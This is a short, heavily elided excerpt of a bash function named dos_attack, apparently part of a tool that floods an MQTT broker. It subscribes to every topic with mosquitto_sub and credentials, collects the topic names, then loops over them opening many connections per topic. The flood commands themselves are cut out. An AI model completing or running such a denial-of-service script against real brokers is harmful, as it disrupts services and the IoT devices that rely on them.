...
dos_attack() {
    ...
    declare -A topic_map
    #timeout 5 mosquitto_sub -h "$ip" -p "$port" --cafile $cafile -u "$username" -P "$password" -t '#' -v | while read -r topic _; 
    while read -r topic payload; do
        echo "Topic inside loop: $topic"
        topic_map["$topic"]=1
    done < <(timeout 10 mosquitto_sub -h "$ip" -p "$port" \
         --cafile "$cafile" \
...
# Convert associative array keys into a bash array
    ...
    for topic in "${topics[@]}"; do
        ...
        for i in $(seq 1 $connections); do
            ...
            sleep "$delay"  # Optional
        done
        echo "[+] Flooded topic: $topic"
    done
